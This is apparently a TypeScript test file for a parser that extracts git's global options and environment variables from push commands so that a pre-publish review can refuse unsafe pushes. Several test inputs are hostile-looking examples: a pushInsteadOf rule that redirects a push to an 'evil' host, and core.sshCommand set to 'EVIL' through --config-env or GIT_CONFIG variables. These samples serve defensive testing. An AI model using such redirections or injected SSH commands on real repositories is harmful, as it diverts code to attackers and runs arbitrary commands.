/**
 * What a git push runs with besides its push arguments — git's own options
 * before `push`, and the variables the command sets for it — read off the
 * command line, so the pre-publish review can refuse a push it would not
 * reproduce (publish-review/push-dry-run.ts, refusePushInvocation).
 */
import { describe, it, expect } from "vitest";
import { join, resolve } from "node:path";
import { publishOperation, publishOperations } from "./publish-operation.js";

const BASE = resolve("/work/repo");
const bash = (command: string) => publishOperation("bash", { command, _cwd: BASE });

describe("git's own options before push", () => {
  it("are kept in order, each with its value, apart from the push arguments", () => {
    const op = bash("git -c url.https://evil/.pushInsteadOf=https://good/ --git-dir=.git --work-tree w --bare --no-pager push https://good/r main")!;
    expect(op.gitOptions).toEqual([
      { name: "-c", value: "url.https://evil/.pushInsteadOf=https://good/" },
      { name: "--git-dir", value: ".git" },
      { name: "--work-tree", value: "w" },
      { name: "--bare" },
      { name: "--no-pager" },
    ]);
    expect(op.pushArgs).toEqual(["https://good/r", "main"]);
  });

  it("--config-env in both spellings; -C both moves the review and is listed", () => {
    for (const command of ["git --config-env=core.sshCommand=EVIL push", "git --config-env core.sshCommand=EVIL push"]) {
      expect(bash(command)!.gitOptions, command).toEqual([{ name: "--config-env", value: "core.sshCommand=EVIL" }]);
    }
    const op = bash("git -C sub push")!;
    expect(op.cwd).toBe(join(BASE, "sub"));
    expect(op.gitOptions).toEqual([{ name: "-C", value: "sub" }]);
  });

  it("an option whose value is the next word does not hide the push behind it", () => {
    for (const command of ["git --attr-source HEAD push", "git --shallow-file x push origin main"]) {
      expect(bash(command)?.kind, command).toBe("git-push");
    }
  });

  it("a plain push has none", () => {
    const op = bash("git push origin main")!;
    expect(op.gitOptions).toBeUndefined();
    expect(op.gitEnv).toBeUndefined();
  });
});

describe("the variables a git push runs with", () => {
  it("assigned in front of git: bare, through env or sudo, several at once", () => {
    expect(bash("GIT_SSH_COMMAND='ssh -i k' git push origin main")).toMatchObject({
      kind: "git-push", pushArgs: ["origin", "main"], gitEnv: ["GIT_SSH_COMMAND"],
    });
    expect(bash("env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.sshCommand GIT_CONFIG_VALUE_0=evil git push")!.gitEnv)
      .toEqual(["GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"]);
    expect(bash("A=1 sudo GIT_DIR=/x git push")!.gitEnv).toEqual(["A", "GIT_DIR"]);
  });

  it("assignments in front of any publish no longer hide it", () => {
    expect(bash("VERCEL_ORG_ID=x vercel --prod")?.kind).toBe("deploy");
    expect(bash("CI=1 npx vercel deploy")?.label).toBe("vercel deploy");
  });

  it("set earlier in the command, in bash, PowerShell and cmd", () => {
    for (const command of [
      "export GIT_SSH_COMMAND='ssh -i k'; git push",
      "declare -x GIT_SSH_COMMAND=x && git push",
      "GIT_SSH_COMMAND=x; export GIT_SSH_COMMAND; git push",
      "$env:GIT_SSH_COMMAND = 'ssh -i k'; git push",
      "$env:GIT_SSH_COMMAND='ssh -i k'; git push",
      "${env:GIT_SSH_COMMAND} = 'x'; git push",
      "set GIT_SSH_COMMAND=x&& git push",
    ]) {
      expect(bash(command)?.gitEnv, command).toEqual(["GIT_SSH_COMMAND"]);
    }
  });

  it.each([
    "read GIT_SSH_COMMAND <<< x; export GIT_SSH_COMMAND; git push origin main",
    "printf -v GIT_SSH_COMMAND x; export GIT_SSH_COMMAND; git push origin main",
    "declare -x GIT_SSH_COMMAND; git push origin main",
  ])("named by the export family with no value, set some other way: %s", (command) => {
    expect(bash(command)?.gitEnv).toEqual(["GIT_SSH_COMMAND"]);
  });

  it("several names in one export, with and without a value", () => {
    expect(bash("export GIT_DIR GIT_WORK_TREE=w; git push")!.gitEnv).toEqual(["GIT_DIR", "GIT_WORK_TREE"]);
  });

  it("a nested shell inherits them; one set inside it, after the push, or for another command does not count", () => {
    expect(publishOperations("bash", { command: "export GIT_DIR=/x && bash -c \"git push\"", _cwd: BASE })[0].gitEnv).toEqual(["GIT_DIR"]);
    for (const command of [
      "bash -c \"export GIT_DIR=/x\" && git push",
      "git push; export GIT_DIR=/x",
      "GIT_DIR=/x make && git push",
      "echo $env:GIT_DIR; git push",
    ]) {
      expect(bash(command)?.gitEnv, command).toBeUndefined();
    }
  });

  it("passed in process_start's env argument", () => {
    expect(publishOperation("process_start", { command: "git push", cwd: BASE, env: { GIT_SSH_COMMAND: "x" } })?.gitEnv)
      .toEqual(["GIT_SSH_COMMAND"]);
  });

  it("only a git push carries them", () => {
    expect(bash("export GIT_DIR=/x; vercel --prod")!.gitEnv).toBeUndefined();
  });
});

describe("assignments in front of a command are not the command", () => {
  it("a word after them that ends in /cd is not a cd", () => {
    expect(bash("X=a/cd elsewhere && git push")!.cwd).toBe(BASE);
  });

  it("a cd behind them still moves the push", () => {
    expect(bash("A=1 cd sub && git push")!.cwd).toBe(join(BASE, "sub"));
  });
});
